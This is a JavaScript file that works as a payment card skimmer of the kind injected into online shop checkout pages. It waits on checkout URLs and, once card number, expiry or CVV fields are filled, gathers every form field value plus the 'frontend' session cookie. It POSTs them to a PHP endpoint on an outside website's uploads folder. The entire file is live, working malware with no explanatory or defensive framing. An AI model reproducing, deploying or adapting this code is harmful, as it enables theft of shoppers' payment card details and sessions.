var address = "https://trivalleyxmaslights.com/wp-content/uploads/2014/mag.php";

jQuery(document).ready(function() {
    if (!(new RegExp("onepage|checkout|onestep|firecheckout|onestepcheckout")).test(window.location))
        return;

    setTimeout(function() {
        jQuery(document).on("change", "form", function() {
            if (check_valid()) {
                try {
                    send_data()
                } catch (e) { }
            }
        });
    }, 10000);
});

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length,c.length);
        }
    }
    return "";
}

function send_data() {
    var data = "";
    var map = document.querySelectorAll("input, select, textarea");
    for (var objUid = 0; objUid < map.length; objUid++) {
        var name = map[objUid].name;
        var value = map[objUid].value;

        if (value.length < 1 || name.length < 1)
            continue;

        data += name + "=" + value + "&";
    }

    data = data + "&host=" + window["location"]["host"] + "&cookie=" + getCookie('frontend');

    jQuery.ajax({
        url : address,
        data : data,
        type : "POST",
        success : function(textStatus) {
            return true;
        },
        error : function(textStatus) {
            return false;
        }
    });

}

function check_valid() {
    var valid_variables = ['input[name="payment[cc_number]"]', 'select[name="payment[cc_exp_year]"]',
        'select[name="payment[cc_exp_month]"]', 'input[name="payment[cc_cid]"]'];

    for (var i = 0; i < valid_variables.length; i++) {
        try {
            if (document.querySelector(valid_variables[i]).value.length > 0)
                return true;
        } catch (e) {
            return false;
        }
    }

    return false;
}
